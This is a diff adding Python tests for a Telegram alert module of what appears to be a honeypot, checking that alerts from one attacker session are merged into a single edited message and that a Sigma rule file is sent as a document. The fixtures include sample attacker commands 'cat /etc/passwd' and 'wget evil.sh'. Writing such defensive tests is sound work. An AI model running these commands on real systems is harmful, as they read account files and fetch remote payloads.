@@ -248,3 +248,74 @@ def test_direct_endpoint_requires_internal_token(monkeypatch):
     assert c.post("/api/v1/notify/direct", json={"chat_id": "abc", "text": "x"},
                   headers={"X-Internal-Token": "orch"}).status_code == 422
     assert sent == [("777", "код")]
+
+
+def test_send_alert_session_debounce_groups_commands(monkeypatch):
+    monkeypatch.setattr(ts, "TELEGRAM_BOT_TOKEN", "test-token")
+    monkeypatch.setattr(ts, "TELEGRAM_CHAT_ID", "12345")
+    ts.ACTIVE_SESSION_ALERTS.clear()
+
+    calls = []
+
+    class MockAsyncClient:
+        def __init__(self, *args, **kwargs): pass
+        async def __aenter__(self): return self
+        async def __aexit__(self, *args): return False
+        async def post(self, url, json=None, headers=None, data=None, files=None):
+            calls.append({"url": url, "json": json})
+            class Resp:
+                status_code = 200
+                def json(self): return {"ok": True, "result": {"message_id": 42}}
+            return Resp()
+
+    monkeypatch.setattr(ts.httpx, "AsyncClient", MockAsyncClient)
+
+    # 1-й алерт: создание нового сообщения
+    asyncio.run(ts.send_alert("honeymind_threat", "10.20.0.1", {
+        "session_id": "sess-abc",
+        "command": "cat /etc/passwd",
+        "threat_score": 75,
+        "category": "credential_access"
+    }))
+    assert len(calls) == 1
+    assert "sendMessage" in calls[0]["url"]
+    assert "cat /etc/passwd" in calls[0]["json"]["text"]
+
+    # 2-й алерт той же сессии: вызов editMessageText вместо создания нового
+    asyncio.run(ts.send_alert("honeymind_threat", "10.20.0.1", {
+        "session_id": "sess-abc",
+        "command": "wget evil.sh",
+        "threat_score": 90,
+        "category": "malware_execution"
+    }))
+    assert len(calls) == 2
+    assert "editMessageText" in calls[1]["url"]
+    assert calls[1]["json"]["message_id"] == 42
+    assert "wget evil.sh" in calls[1]["json"]["text"]
+    assert "cat /etc/passwd" in calls[1]["json"]["text"]
+
+
+def test_send_document_helper(monkeypatch):
+    monkeypatch.setattr(ts, "TELEGRAM_BOT_TOKEN", "test-token")
+    doc_sent = []
+
+    class MockAsyncClient:
+        def __init__(self, *args, **kwargs): pass
+        async def __aenter__(self): return self
+        async def __aexit__(self, *args): return False
+        async def post(self, url, data=None, files=None, **kwargs):
+            doc_sent.append({"url": url, "data": data, "files": files})
+            class Resp:
+                status_code = 200
+                text = "ok"
+            return Resp()
+
+    monkeypatch.setattr(ts.httpx, "AsyncClient", MockAsyncClient)
+
+    ok = asyncio.run(ts.send_document("123", "title: test sigma", "rule.yml", caption="Sigma Rule"))
+    assert ok is True
+    assert len(doc_sent) == 1
+    assert "sendDocument" in doc_sent[0]["url"]
+    assert doc_sent[0]["data"]["chat_id"] == "123"
+    assert doc_sent[0]["files"]["document"][0] == "rule.yml"
+
